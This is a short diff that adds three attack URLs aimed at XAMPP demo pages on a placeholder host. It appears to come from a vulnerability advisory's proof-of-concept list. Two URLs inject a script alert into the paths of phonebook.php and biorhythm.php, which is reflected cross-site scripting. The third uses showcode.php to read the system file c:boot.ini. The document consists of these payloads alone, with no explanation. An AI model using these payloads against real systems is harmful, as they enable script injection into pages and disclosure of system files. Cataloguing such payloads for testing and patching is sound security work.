@@ -1,0 +1,3 @@
+http://www.exmaple,com/xampp/phonebook.php/&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+http://www.exmaple,com/xampp/biorhythm.php/&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+http://www.exmaple,com/xampp/showcode.php/c:boot.ini?showcode=1
